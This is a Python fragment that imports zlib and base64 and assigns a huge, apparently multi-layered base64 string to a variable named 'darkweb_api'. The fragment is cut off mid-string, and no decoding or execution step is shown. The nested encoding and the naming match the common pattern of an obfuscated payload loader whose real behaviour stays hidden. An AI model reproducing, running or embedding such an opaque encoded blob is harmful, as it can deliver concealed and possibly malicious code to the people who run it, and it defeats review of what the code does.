import zlib, base64
darkweb_api = "VjIwMVMyUnRTbFJSYWtKaFZqTm9jMXBGWkc5a2JVcHdVVzVDYVZkRlNqSlpNalZTV2pGYVNGWnVUbUZXTWxJMVYxWmplRkpIU2toaVIzaHBZbXhHZWxOVmFFOU9WMHAwVkZoT1NsSXhXWGxYYkdNeFRVZE9NMk5ITVdwaVZHd3dVMVZvVTJKSFNraFdha0pvVW5wc01WUkhOVk5qTUhoMFYycEdhV0pWTkhkWlZtTTFaRmRPTlU1WVVtRlhSVFUyVjFaa2EySkhUalZSYmtKcFYwVktNbGt5TlZKYU1VbDVWbXBDVkZJeWVEWmFSV00xWlZkV1YxTnRlR3BYUmxweldYcE9VbU13YkVaYVIzaHJVbFZ3TWxwRlZrOWhSMHBJWlVkc1dsWXdOWGxWVm1NeFpXMVJlVlp1YkZaaVZsbzBXa1prVjJWdFVrSmpSekZxWWxSc01GTlZhRk5pUjBwSVZtcENhRko2YkRGVVJ6RlhaVmRPZEU5WWJHcGxWVXAzV1d4b1EyUnRUblZWVjJSV1RXeGFObGw2U25Oa2JVcHpVVzFvYWswd05IcFphazVMWVRGU2RGWnRlR0ZTTVZweVZXeG9TMlZYU1hwVFZYUmhZbXR3TWxsc1RrTk5SbkJZWlVkNGExSXlhREpaYldzeFlrZE9kVk51V21waWF6RnVXVlpqZUdReVNYcFRha0pLVWxad2VsbHFTVFZoTVZsNVVtNUNhMUpXV2pWWk1qQTFaVlZPZEZkdWJHbE5ha0p1V2tWa2MyUkdjRlJSYmtKcFYwVktNbGt5TlZKYU1rMTVaVWQ0WVZkRlJreFpWbU40WkRKSmVsTnFRa3BTTTBJMldXcEpNR015VG5SV1dFNXFUVEo0TmxSRll6VmxhMDUxVlc1c2JGWkhPVXhUVlU1Q1dqSkdXRTFZWkdsTk1HOTNVMVZvUzJKSFRsbFdiWGhxVFRGS05sRXliRUphTUd4SVYyNXNhVTFxUW01WFZ6Vk9UVVZzU0dKSVVtcFNlbXcxV2tWT1ExRXhjRmhTYWtaclVqSjRkRnBHWkRSV1IwbDZWbTVrUkdKV1dUQlhWRXBYWkRKU1JXSXdkRXBSTUVadVdUQm9TMk5IU25WVlYyUk1VVEJ3U2xsc1kzaGtSV3hHWlVoYWFVMXVValpUVldRMFkwZEZlVlpYWkZWV2VteHlXa1prTkdKRmJFZFRiWGhxVjBaYWMxbDZUbE5sYTJ4SVVtNVdZVkV3U2tSWk0zQlNXakpHV1ZSWFpHbGlWR3QzVTFWa2MyUlhUWHBWYldocFVqTmtNVmRGWXpCYU1WcElUMGRrYUZaNlZqWmFSV1JIWXpKS1JGRnNSbWxTTVZwdldYcEtWbG94V2tsaVNHUmhWVEJLTTFsV2FFSmFNa1pZVGxod2ExSXdXbnBaYTA1RFpWWndXVkpxUm1GWFJUUjNXVE5zUTJGSFNuUlZWMlJxVWpKNE0xTlZaSE5rVjAxNlZXMW9hVkl6Wkc1WFZ6Vk9UVVZzY0dFd2RFcFJNRVp1V1hwT2MyVnJlSFJXYWxKb1YwWkdkbE14Um5aVE1XdzFVVlJzU2xORmNITlpNV2hYWWtkTmVsVnVjRTFpUlRWeldYcE9UMk5IU1hsT1J6bE1WVmM1VEZFeU1VdGhSMHAwVGxkNGFtRlZSVFZUVlU1S1lWVnNibUo2YkZGV1JFRTFWVVpSZDA5V1FsVk5SR3hSVmtSQk5WVkdVWGRQVmtKVlRVUnNVVlpFUVRWVlJsRjNUMVpDVlUxRWJGRldSRUUxVlVaUmQwOVdRbFZOUkd4UlZrUkJOVlZHVVhkUFZrSlZUVVJzVVZWWVFsVlhWRTVMWTBkT1NWVlhaRkpOTUhCdlYxUktNR0pHY0VSUlZ6RktVbXhLTlZkV1l6RmxiVXBJVW1wQ1lWWXhSbTVYVnpWeVdqRldSbUZGVWsxV1ZFWnZXVlJLYzFFeVNYaFZWMlJFWVdwQk5WVkdVWGRQVmtKVlRVUnNVVlpFUVRWVlJsRjNUMVpDVlUxRWJGRldSRUUxVlVaUmQwOVdRbFZOUkd4UlZrUkJOVlZHVVhkUFZrSlZUVVJzVVZaRVFUVlZSbEYzVDFaQ1ZVMUViRkZXUkVFMVUxZHNTbUZWVG01alNFSmhZVlZLTVZscVRsSmFNa2w2VkZoV2FsSXdXWGRaVlUweFlrZFdTR0pJY0d0VFJURjJVMWMxVDJKSFRYcFVia0pwVFdwU2NGTXhVblpUTUd4RVVWZGtTbEo2YkRaVVJ6QjRZVWRGZVZadGRHaFhSWEEyVXpCT1MyVnNjRmxVYm5Cb1ZucHNNVk5YYkhKVE1FNTFVVzVzYUZaNlZYZFRWVTV2WVZac1dFNVlWbUZYUld4M1VUSXhjMkpWYkVobFIzaHBZVmRvTmxwV2FFNWtWbXhaVTIwMWEyRlhjelJVVjNCMlV6QnNSRkZYWkdwVFJYQjNXVzAxVWxvd2RFUlRiRnBxVFd0YWRWZHNUa0pPYTJ4SlVXcFdhMUl5YURKWmJXeERaRVpzV0dKSVZrMWlhMGt4VTFWT2VrMXJNWEJUV0VKRVlWVkdibE5WYUU5T1YwNDFUbGQ0YkZJeWQzZFRNRkpHWTBWT2JtTkhkR0ZXTVd4dVdrVm9WMlJXYjNsYVJFWk1VMGRrZDFReVpIWmFNR3hFVVZka2FrMHllRFpVUnpWUFRVWndTRTlVUm10UmVsWjBXV3RvVjJWdFJrUmFNMEpFWVZWR2JsTlZUa05pVjBsNlUxZGthbUpXV2pCWFZtUnpaRmRHV0U1WE5VcFNNbmd4VTFWb1MyRkhTblJhUjNoTVUwZGtlbE5WVWtKak1HeEVUVWhvVEZaSE9VeFRWVTVDV2pCc1JGRlhaRXBUUlRReFdUTnJNV1Z0VWtoVmJscHJWMFpHTVZkdE1UUk5WMDE1V2pJNVRGVlhPVzVUVlU1Q1dqQnNSRkZYWkdwTmJtaHpWMnhvUW1Jd01WUmhNSFJLVVRCR2JsTlZUa0phTUd4SlZHcFdhbVZVVmpaYVJXUlRaRzFTV1ZWWVZtRmlXR2Q0V1hwS2JtSXdkRkppTUhSRVlteGFiMVZHYUhwaFZscFpWRzE0YW1GVVJrTlhha3BYWkZkU1JGTlVXa3BSTUhCUFdXcE9kMk5IU2tobFIyaE5aV3hXTVZSVlRrSmlNVkpJWWtoV2ExZEhZek5UVlZaSFpGWndTVk51V21oV01VWnVWR3hOTUdWRk9UVlJhMHBPVmtac00xUlliRU5STWxKWVlraE9ZVkY2YkU1V1JscHlUVVUwZDJGNlpFcFRSMUY1VXpGT1ExRnRUa2xSYms1aFZtMVNjMWRYZERCalIxSkVUMFJHVG1WdFRqRlVXSEJhV2pCMFJtUkZiRmRTVkVaT1ZFVk9RMk15Umxoa1IzaEtVbGRTYzFkVVNqQmthM1JVVVd4a1lWZEZjRFpaVm1NMVpGVjRObFZZVms1Uk1FcEZXVlZvUzJSdFNsaFdXRnBQVWtVeE1WUlZUVEJsVlRFMlZsUk9UV0ZyVmpWVVZrNURWRzFKZVZOdVFtbFNNVlp1VmxSS1IySldiRmxUYmtKTlpXeFdObFJ1YXpCbGF6VndVMnBzUkZveU9VeFJNakZIWkRKR1YwOVlRbUZSTUVVMVUxVlNhbVZGTlRaVldHeFBWVmhDYjFrd1pITmFiVVpJVW01d2FGRXdSVFZUVlU1cVpXc3hjVk5VUms1aGJIQnlWRmN4VG1Wck1UWldXR1JhWVd0YWNsUlljRlpsYXpGSVZXMTRUbVZyYTNwWFZFcGFaREE1U0ZSWVpFOWxWMDVNV1RCa2IyUnRTblJXYlZwcFlteGFNRmRYTVZkbFZXeEZUVWRrYWsweWVEWlVSekZIWlZadmVsZHRTazVXYWtKTVVUSXhUMk15UmxoV2JsWnJVVEJGTlZOVldsTmlSMHBJVm0wMWFtSlZXakJWVkVvMFkwWndXRTVVUWt4Uk1IQTJWMnhvVDJWdFJsaFBXRlpOWlZWc2VWa3daRzlrYlVwMFZtMWFhV0pzV2pCWFZ6RlhaVlY0UkZGdGFHcFNNbmh0V1Zaa1VtTXdiRWhTYm1Sb1ZtcHNkbGRXYUU5aU1IUlNZMGR3YVZJeWVITlpiVFZTWkZacmVVOVlWbWxpVmxweFdrVk9ibU5GVG5SaVJ6RktVbnBXTWxwRlRrTmhiVXBJWWtkNGFXSnNSakZaVm1oUFdtMVNXVlJ0ZUdwaVJHeHZXa1pvVTJJeVNYcFRia0pzWWxaYWNsTXdUbkpPYTA1d1VWZGthMU5GYnpGVU1tUjJXakJzUkZGWFpGcE5ibWgzVjJ4ak1VMUZlSFZVYlhocFlsWktiVmRVU1RWaE1YQlhUMWhzWVZkRldYaFhiR2hQVFVWMFNWRnRPV2xOYWxaelYwUkpNVTFYU2xoVGJYaHFZVmQwVEZOVlRrSmFNR3hJVFZkNFNsSkVRbTVYVkVvMFkwWndXRTVVUWsxaWF6VjNWMnBKTVZwdFJsaE9SemxxVWpKb01sbHRNVmRhYlVwMVZtNVNXbUpXV2pWVVJVNURZMGRLZFZGcVJtdFJNbVIxVld4ak1VMUdjRmxUVjJSWFVqRmFlbGRzWkd0bFZteFlUVWRrVWsxcWJISlhiRTVDVG10c1JGa3pRa3hWVnpsdVUxVmtWMDVHYTNsV2JtUnJVVEJLVlZkc2FFOWxiVVpZVDFoV1ZsSXdXalpaZWs1clpHMU9kRlZyT1dGV01WcHlWMnhrVTFKdFRuVlRibHBxWVcwNVRGTlZUa0phTWs1SVVtNXdhazB5VG01VlJrNURZMGRLZFZGcVJtdFJNbVJ3VmpGak5VMVhUbkJSV0d4aFlsVldibFpWWkVkbGJVMTZXa2hhYW1KV1JtNVVNbXhDWVZWMFVtSXlaRXBSTUVvd1YyeE9RazlWYkVoVWJrNW9WakZhTVZwRlRURmxiVkpJVW01c2ExRXlhRE5aVldNMVpGWndWMDlZVm10V2VrWndWMnhvU21NeVRraFNibkJxVFRKT2QxRXlNSGhPVjAxNVZtNU9ZV0ZWUlRWVFZXUlBZekpHV0ZadVZtdFJlbFoxVjJ4b1UxcHRTbGhXVnpsTVZWaENNbGt6YXpGbGJWWlpWR3BDWVZaNlFuWlRWekZQWXpGd1dGSnViRXBoVjNSTVdUQm9TMk5IU25WVlYyUk1VakJ3YjFsdE1ERmlSMDV3WVRCMGFsTkZjSGRaYlRWU1dqQjBSRk5zYUdGV00yaHhXV3BKZUdKRmJFZFZibHBLVW14S2MxbHJaRmRpYlU1MFVtNVNTbEpZYUZaVldHeERVa2RLU0dKSGNHaGxWVXBFV1dwT1VtRlZlRWhOVkZacVRXeGFlbGR0YXpGaVYwWlpVMjV3YTFKcWJERlhWbU40WWtWMFVtSXdkR3BUUlhCM1dXMDFVbG93ZEVSVGJVNXBZVlZLVlZwRlpFZGxWMUpJWWtoV1lXVlZTa1ZaYTJSSFkwZEtWRkZZVmtwUmVsSnVWRWRzU21ORlRuVlZibXhzVmtjNVRGTlZaRTlpTVd4WVRsaFdZVll6YUcxWGJHTXhUVWRHV1ZWcVZsRldNRFY2V1Zaa1YyUlhVa1JPVnpWaFYwWktiVmRzWXpGTlIwWlpWV3BXVEZFd2NFSldSV1J6VFVad1dGUnVXbWhXZWxadFYxUktOR05HYTNsa1IxcGFZbFJyZDFOWGJISlRNR3hJVkcwNVdsWjZWakZYYkdRMFdtMVNXVlJ0ZUdwaVZGWnZXV3hrVms5VmJISlJhekZvVjBaS2MxZFVTVFZqUjBwelQxZHdhVkl5ZUhGWlZFVTFZVmRKZWxWWGJFUmhWVXAwV1dwT1Nsb3lSbFJSYmtKcFlWVktOVmRXWXpGaWJIQlVXbnBHVGxKRlJqTlVWVkpDWkRCMFZXSXdkRXBSTUVweFdXdGtjMkpIU25WVldGWnFUV3hhTVZkcldUVmtSbkJaVkc1d1dsWXlVbk5UTUdSWFpGZFNTR0pFUW14V1JFWnhXVlZrUjJSWFNuUldiazVaVFd4YU1WcEZaSE5OUjFaVVpVaFNZVmRGTlRaWFZtUnJZa1pDVkZOdFRteFNNV3d6VjBWb2JrNVdjSE5sUkZKUVZrWndhbHBWWkVaTlZXeEhWMjVDYWsxdGQzZFRWV2hQWTBkU1NGWnVjRXBoVjNSTVUxVk9RMlZ0U2toV2JYaHFVVEprTmxNeFJuWmFNR3hKVVc1YWFrMHhTalpUVlZGM1dqRnJlV1ZJUW1GV2VsVjNVekJXYTJKSFVrWmhTRUpxVFRGS01sa3lOWE5WTVhCWlVtcEdZVmRGTkhkVE1HaERZa1p3V1ZOVWJGcE5iV2h2V1cwd01XSkhTa2RQVjNocFlteEtkMXBGYUhKak1rcElZa2hTYUZkR1JUVlVWazQwWkd4d2RGZHVjR0ZYUmtwdFYydGtSMDFHY0ZWTlZUbHBUV3BXYzFSRll6VmlWbkIxVkcxNGExSnFiSGRYYTFGM1pEQjRTRTFYYUd4U2FteDNWMnRSZDJRd2VFaE5XRUpwWWtSc2QxZHJVWGRrTUhoSVVtMTBZVkpxYkRKWGJURmhaV3h3V1ZWVWJFNVJNMmgyVjFab1QySXhRbFZSV0VKTVZWYzVibE5WWkhOaVZXeEpVVzVhYWsweFNqWlVSekI0WWtkTmVsUnRhR0ZOYkZvMlZqTndRMXBGZUhSTlYzaHFUVEExYjFkcVNsWmtWbkIwWWtoV1lWRXlaSEJYUldNeFZrZEplbE51Ykd4Vk0yUnVXa1ZrYjJKSFRuUldWMlJhVjBWd2MxTlZZekZrYTJ4SVRsZDRhMlZWU205WGEyaE9XakZzV1ZkdGFHaFdNMmh2VjFjeE5HSkZiSEJoTW1SS1ZrUkNibFJHVWtaT2EwNXdVVmRrU2xFd1JtNVpNR2hMWTBkS2RWVlhaRXhSTUhCcVdXMTBSMkV5VGpWUmJXaHFZbFpXYmxreU5WZGtWV3hJVDFSR2ExRXdWbTVXYTJoTFRsVnNTRkp0TlZwV01uZ3hVMVZvVTJSdFNsaFBXR3hxWWxScmVsTlhiSEpUTUd4RVVWZGtTbEV3U25GWmEyUnpZa2RLZFZWWVZtcE5iRm94VjJ0Wk5XUkdjRmxVYm5CYVZqSlNjMU13WkZka1YxSklZa1JDYkZaRVJuRlpWV1JIWkZkS2RGWnVUbGxOYkZveFdrVmtjMDFIVmxSbFNGSmhWMFUxTmxkV1pHdGlSa0pVVTIxT2JGSXhiRE5YUldodVRsWndjMlZFVWxCV1JYQnFXbFZrU21Rd2JFWlRiV2hwVWpCYU1WZFVTbFpoVlhSU1lqSmtTbEV3Um01VFZXaFBZekZ3V0ZadVpFeFNSbFozVVRKc1Fsb3diRVJSVjJScVVucHNObHBGYUU1YU1VSlVVVzF3YVZJeWVITlpiVFZTWWpGSmVWWnFRbFJTTW5nMldrVmpOV1ZYVmxkVGJYaHFWMFphYzFsNlRsSmlNazVJVm0xNGFtRnFSbkZaVldSSFpGZEtkRlp1VGxsTmJGb3hXa1ZrYzAxSFZsUmxTRTVvVm5wR2QxcEZVWGRsUlhoSVQxY3hZV0pyTlhOYVJWazFZVEZzV1ZWdGVGRldWRll5V1cweFZtTXlTWGxYYlRGcVRXeFpkMWRFU25OaE1VSlZVVmhPYVZZd1dUQlhSRXB6WVRGQ1ZWRllUbWxXTW5neFYwUktjMkV4UWxWUldFNWFWakZLY2xkRVNUVmlWbkIxVkcxNGExSkVRak5VUldSdllVZE5lVnA2YkU1Uk1uUjNVVEpzUWxvd2JFUlJWMlJwVmpGYU5sbDZTa2RpYkhCVVVWUnNTbE5GU2pKWmVrNVRaV3Q0ZEUxWGVHcE5NRFZ2VjJwS1YyVnNaRFpSYlZKTllsUkdjMWw2VGs5aFJtOTVWbFYwU2xFd1JtNVRWVTVEWkRKT2RHSklWbXRSTUVaMldXeGtWMlZ0VFhsU2JUVmhWVEowVEZOVlRrSmFNR3hFVVc1d2JGZEZNVEZYYkdodlkwZFNSRm96UWtSaFZVWnVWMnhrTkdWc2NGVmlNSFJLVVRCR2JsTlZhRk5sVjFaVllqQjBTbEV3Um01VFZVNURUVmRPZEdReVpGRlZNRW96V1dwT1QwMUhUalZPV0ZKaFYwVTFObGRXWkd0aVIwMTRZek5rV1ZWNlZqVlhiR2hEWXpKV1YwOVlVbHBYUlhCNVdrWm9RbVJYVG5SUFZFNXFUVmhPTTFkR1RURmhWMUpaVldwQ2FVMXFWalpXTTNCRFdrVjRkVlp1YkdsUlZ6bHVVMVZPUWxvd2JFbFVhbFpxWlZSV05scEZaRk5rYlZKWlZWaFdZV0pZWjNoWmVrcHVZakIwVW1JeVpFcFJNRVp1VTFWb1QwNVhUalZPV0hCclVqRktNbHBHYUZKa1YxRjZVMjVDYTFJeFZuWlRWM2cwWkZaYWRHSkljR2hYUmtadVUxZHNNRTFYVG5Sa00wSkVZVlZHYmxOVlRrSmFNazE2WWtod1RXSnJOSGRYYTJNMVRWZFNSRTVYTVdsVFJsbzJXVlZPYm1ORlRuQlJWMlJLVVRCR2JsbFdaRkphTVVKVVVXNWthVTB3TkhkWk0yc3haRVp3V1ZSdWNGcFdNbEp6V1hwR2VtUXhhRlJPV0VKaFVWYzVibE5WVGtKYU1HeEpVMWRrVVZVd1NuRlVSekZyWWtkU1JHRkVSbXBpV0dSNlUxVmtiMkpHYkZoVmJYaHFZbXN3TlZwR1pFWmpNR3hKVlc1Q2FWWXhXakphUm1oU1QxVXhWVlpZVGtwU01GcDZXV3RqTlUweFozcFRiWGhoVWpKNE5WZHNaRTlOUjA0MlRWWldhbUpzV25OVE1VWjJXakJzUkZGWFpFcFRSVFV5V2tab1Fsb3hRbFJSYTA1aFZqQlplRnBGWkhOaVYxSllaVVpTYVUweFdqTlRNR2hLWkZacmVVOVlWbXRTTVZveFdrVk9NMkZYUmtsVmJsSnBVWHBXTTFkV2FFdGxiSEJaVTFkc1RGVlhPVzVUVlU1Q1dqQnNTR0pITVVwVFJUVXlXa1pvUW1SV2NIUmlTRlpoVVRKa2NGZHJaSE5OYTJ4d1pVZHdhVkl3V2paWmVrVTBUMVZzZEZrelVtcGlWbHB4VjFab1EwMUdhM2xoUjJoS1lWZDBibGxXYUU1YU1WSjBUMWhXWVZVd1NtOVpiVEZTV2pKTmVVOVVSbXBSZWxaMFdWWmpNV0V3ZEVSYVIzUm9WMFpzZFZSRlRrTmpSbkJGVFVkc2FGSXhXbTlYYTJSTFlVZE9jRk5ZUWtwU01uZzJVMVZWTVdSdFNuUldWRnBFWVZWR2JsTlZUa0phTUd4RVVWZGthazF1YUhOWGJHaENZakF4Y0dFd2RFcFJNRVp1VTFWT1Fsb3diRVJSYm5Cc1YwVXhNVmw2VGxOaE1rbDZWbXBDVFdKV2NIcGFSbWhQWWpCMFJHRXdkRXBSTUVadVUxVk9RbG93YkVSUmJtUnBUVEEwZDFremJFSlBWV3hJVkc1T2FGWXhXakZhUlU1dlUwWndXVlZyYkdoWFJUUjNXV3BPUzA1V1ZuUldibWhyVmpGYU5scEZUbTlrTVhCWVZtNXNVVll3TlhaWFZtTXhaRlp3V0dWSFdtRldlbFYzV1Zab1UwNVZlRWhsU0VKcFZqSjNkMVZHVWtaak1rbDVWMjB4YWsxc1dYZFhSRXBUWVVkU1NGWlViRlZpVkd3eFYyeE9OR1JzY0hSWGJuQmhWMFpLYlZsV1pGSlBWVEZFWlVoU1dsZEhhRzFaVm1SU1QxVXhSR1ZJVW1oV2VsWnRXVlprVWs5Vk1VUmxSMmhoVWpGS2JWbHFTbUZpVjAxNVZtcENVVlpGUm5wWlZXUkhaVzFHUlUxSVpFeFZNblJNVTFWT1Fsb3diRVJSVjJSS1VUQktNRmRzYUU5bGJHeFlXa2Q0U2xKRVFtNVpNR00xWlcxU1NWUllWbWxXTVZvMldYcEtSMkpzY0ZsVWJVcE9VbXBDTVZsc1pGZGxiVTE1VW0wMVlWVlhPVzVUVlU1Q1dqQnNSRkZYWkVwU01uaDBVMVZvUTJSdFRYcFZibkJOWWxSR2MxbDZUazloUm05NVZtNXdXR1ZyU210VVJ6QjRZa2ROZWxSdGFHRk5iRll4VjIweGMyUldjRVJhTW14WVZucHJlRk5WWTNoTlYwMTZWVmRrYWsweFNtOWFWazVLWTBWc1JGSlViRXBSZWtJMFUxVmpOV1ZWYkVsUmJscHFUVEZLTmxSSE1IaGlSMDE2Vkcxb1lVMXNXalpXTTNCRFdrVjRkRTFYZUdwTk1EVnZWMnBLVm1SV2NIUmlTRlpoVVRKa2NGWlZaRFJpUm14WlZHMTRTbE5GTkhkWFZtaHlXakpKZVU1SGJFeFZNRVp2VlVaT1FtUkZNVlZpTUhSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1NqWlhiR1JPV2pGQ1ZGRnViR0ZWZWxaMFdWWmpNV0V4YkZobFNFNU1VVEJHZFZNd1dqQmhNSGh6VFVoR1lWRXpUbmRUYm13eldqSktXRlp1Y0dwTmExcDFWMnhPY2xNd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVXcENhMVo2Vm5WWGFrNVdZakpHV0U1VVFreFRSVFZ6VjFSR2VtUXhhRlJoTTBKRVlWVkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVplazV6Wld0NGRWUnFRbUZTZW10NFdrVk5NV0pYU2tsV2JuQm9VVEprZDFFeWJFSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqSk5lV1ZIZUdGWFJVWjJWRlpPY2xNd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVXNWthVTB3TkhkWk0yeENUMVZzU0ZSdVRtaFdNVm94V2tWT2IxTkdjRmxWYTJ4b1YwVTBkMWxxVGt0T1ZsWjBWbTVvYTFZeFdqWmFSVTV2WkRGd1dGWnViRkZXTURWMlYxWmpNV1JXY0ZobFIxcGhWbnBWZDFsV2FGTk9WWGhJWlVoQ2FWWXlkM2RWUmxKS1l6SkplVmR0TVdwTmJGbDNWMFJLVTJGSFVraFdWR3hWWWxSc01WZHNUalJrYkhCMFYyNXdZVmRHU20xWlZtUlNUMVV4UkdWSVVscFhSMmh0V1Zaa1VrOVZNVVJsU0ZKb1ZucFdiVmxXWkZKUFZURkVaVWRvWVZJeFNtMVpha3BoWWxkTmVWWnFRbEZXUlVaNldWVmtSMlZ0UmtWTlNHUk1WVEowVEZOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1RFpFWndXVlJ1Y0ZwV01sSnpXVEl4VjJWcmJFVk5SMlJxVW5wc05scEZhRTVrVjBwWVZtNXdhazFyV25WWGJHaFBXV3N4VjAxSVZtbFdNVm8yV1hwS1IySnNjRkppTW1SS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xORk5ERlpNMnN4WlcxU1NGVnVXbXRYUmtZeFYyMHhORTFYVFhsYU1qbE1WVmM1YmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVldoUFl6RndXRlp1WkV4U1JXeDNVVEpzUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTWsxNllraHdUV0pyTkhkWGEyTTFUVmRTUkU1VVRtcGlWM2QzVjJ4T2JtRldhRWhPUjJ4TVRXcEdjMWw2VGs5aFJtOTVWbTVzWVZkRk1YbFRWM2cwWkZWc2NHRXdkRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJLTmxwV2FFNWtWMDE2VlcxMGFVMHhXWGRVUnpGaFl6SlNXVlJ0T1V4Uk1uUk1VMVZPUWxvd2JFUlJWMlJLVVRCS2MxbHJhRTlpUlRsdVlqSmtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFRSVXB2V1hwT1RsTXdiRVJSVjJSS1VUQktjMWxyWkhOaVZXeEpWRzVhYTFkRlJqRlhiVEZ6WkZad1JGb3lOV0ZTTW5kNVUyNXNNMW95UmxoVlZHeEtZbGRvYzFkV1pGTmhWbXhaVTFkc1RGVXdTbmRaTTJ4RFpGZEplbFZYWkZWaVZHd3hWMnhTZGxNd2JFUlJWMlJLVVRCR2JsTlZUa05pVjBsNlUxZGtZVkl3V1hkVFZXUnpaRlZzU1ZSdVdtdFhSVVl4VjIweGMyUldjRWRQVjJocFVqTmtkbE5xU2xOalIxSndXVE5PV2sxdWFHOVplazVQV214Q1ZGTnRjR2xOYWxWM1YxWmtjMlJXY0ZsVFdGSmhZbGhuZUZsV1pGSmhWWFJWWWpCMFNsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVWMVJKTldFeGNGUlJWR3hLVWpGS2IxcEZUVEZpYkhCWlZWYzVTMDFzU205YVJXUkdaRVpyZVU5WGRHRlZNazUzVVRKc1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEpWVzVDYVZZeFdqVlRWVkYzV2pGd1NGSnFRazFpVjFKeldrVk9ibUpzY0VoU2FrSmFWWHBGZDFsV1kzaGlSMDV3V1ROQ1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZvVTJSdFJYbFdibFphVlRCRk5WTlZaRk5oUjFKRVRsYzFZVmRHUm5aVGFrcFRZVWRTU0ZKWVVtdFNlbXg1VjJ4ak1HSnJkRkppTW1SS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1NYZGFSbU14WW14dmVsWlhPV2hXZWxWM1V6Qm9VMk5IU2xoV2JteE1WVEowVEZOVlRrSmFNR3hFVVZka1NsRXdSbTVUVlU1Q1dqSk9jRkZVYkVwU01ERXhXVEJqTldWdFVrUmFNbXhvVTBaSmQxa3dhRTVPYTNnMVQxZDBhVTF0VW5OWFZFbzBZMFpyZVdNelZscE5hbXd3VkVST1MySkhVWGxTYm14aFVUQnNlbGRyWkVkTlJteFZUVlJrU21KVk5USlhhMlJXWVZVNWRGUnVXbUZTTVZaNlUxYzFVMlJ0UlhsV2JsWktZVzVCZDFscVNqQmlSMHAwVW1wc1RWRXdTblpYYkdSSFlURndXVk51Y0ZGWFJscHZWRVZPUTAxSFJsaE5WM2hwVFRGWmQxVkdVa1pOVlhoRVVXMW9hVkl6YURKYVJFVTFaVlp3V0ZWdVFtcGlWbHB4V2tWb1RrOVdXa2xUYWtaaFZUSjBURk5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVDV2pKR2RWUlhaRkZWTUVwNFdYcEpOV1JWZUhSbFNGcGFWakZLTmxNd2FFcGtWMUpJVm1wU2ExRXlkRXhUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxveVRYcGlTSEJOWW1zMGQxZHJZelZOVjFKRVRsUk9hbUpYZDNkWGJFNXVZVlZzU1dWRWFFcFNiWGd5V2taT1EySkdiRmxUYmxaaFZqRkdibE5YYkRCalYwMTRZekkxYW1KV1dYcFhWbWhMWVRCdmVFMUlTa3BoVlVwT1ZtdFdUbG94Y0hSUFdHeEtVMFp3ZDFsNlNuTk5SMFpZVGxjMVNsSXdWbTVaZWtwelRVWndWRkpYYkV4VlZ6bHVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa05sYlZaWlZGaFdhazB4U25KWmFrNVhUVVY0ZEZkdVRtdFhSVFYyVXpCT2NsTXdiRVJSVjJSS1VUQktjMWxyYUU5aVJUbHVZakprU2xFd1JtNVRWVTVDV2pCc1NWUnFWbXBsVkZZMldrVmtVMlJ0VWxsVldGWnJUVEJ3ZDFwRlpGWmlNR3h3VVdwb2JWRXdTa1ZYVm1oRFRVWnJlV0ZIYUVwU1ZrcHpXa1ZrVjJGdFVraFdiWFJLWVZkMFRGTlZUa0phTUd4RVVWZGtTbEV3U2paYVZtaE9aRmROZWxWdGRHbE5NVmwzVkVjeFlXTXlVbGxVYlRsTVVUSjBURk5WVGtKYU1HeEVVVmRrU2xFd1NqWlphMlJYWWtkT1JGb3piRXhWVnpsdVUxVk9RbG93YkVSUlYyUktVakExZWxsV1pGZGtWMUpFWVVWb1lWZEdTa1JaYWs1VFVrWnNXR1ZJVGxwaVZWcHhXVlJDUjJSWFRYcGFSM2hxWWtWd2Mxa3hhRmRpUjAxNlZWYzVXazF0YUc5WmJUQXhZa2RLUjA5VVJtcE5iRm8xV1cweFIyUkdjRlJrTW1Sb1ZqRkdlbEV5YkVKYU1HeEVVVmRrU2xFd1JtNVhhMlJIVFVac1ZVMVlaR2xOTURSM1dUTnJNV1JHY0ZsVWJuQmFWakpTYzFsNlJucGtNV2hVVGxoc1lWZEZTbnBhVmxrMVpFWnNXVk51U210WFJVWXhXVEl3TlUweVRYaGpNMmhaVlhwV2NGcEdhRk5OUjBsNVRsaHdXR1ZyV210VVJ6RlRZVWRTU0ZKWVFreFZWemx1VTFWT1Fsb3diRVJSVjJSS1UwVTBNVmt6YXpGbGJWSklWVzVhYTFkR1JqRmFSRTVMWTBkU1NGWlhPVXBoVlVwdldXMHhVbG94Vlhsa1NFSnFVVEJLUlZkV2FFTk5SbXQ1WVVkb1RXRlVVakZUVms1S1kwVk9jRkZYWkVwUk1FWnVVMVZPUWxveVRYcGlTSEJOWW1zMGQxZHJZelZOVjFKRVRsY3hhVk5HV2paWlZVNXVZMFZPY0ZGWFpFcFJNRVp1VTFWT1Fsb3lUWGxsUjNoaFYwVkdkbFJYYkhKVE1HeEVVVmRrU2xJeFdUQlhWRXBYWkRKU1JXSXdkRXBSTUVadVUxVk9RbG93YkVSUmJuQnNWMFV4TVZsNlRsTmhNa2w2Vm1wQ1RXSldjSHBhUm1oUFlqQjBSR0V3ZEVwUk1FWnVVMVZPUWxvd2JFUlJibkJwVWpGYWMxa3dUbTVsYTNSU1lqSmtTbEV3Um01VFZVNUNXakJzU1ZGdVdtcE5NVW8yVTFWUmQxb3hhM2xsU0VKaFZucFZkMU13Vm10aVIxSkdZVWhDYWsweFNqSlpNalZ6VlRGd1dWSnFSbUZYUlRSM1V6Qm9RMkpHY0ZsVFZHeGFUVzFvYjFsdE1ERmlSMHBIVDFkNGFXSnNTbmRhUldoeVl6SktTR0pJVW1oWFJrVTFWRlpPTkdSc2NIUlhibkJoVjBaS2JWZHJaRWROUm5CVlRWVTVhVTFxVm5OVVJXTTFZbFp3ZFZSdGVHdFNhbXgzVjJ0UmQyUXdlR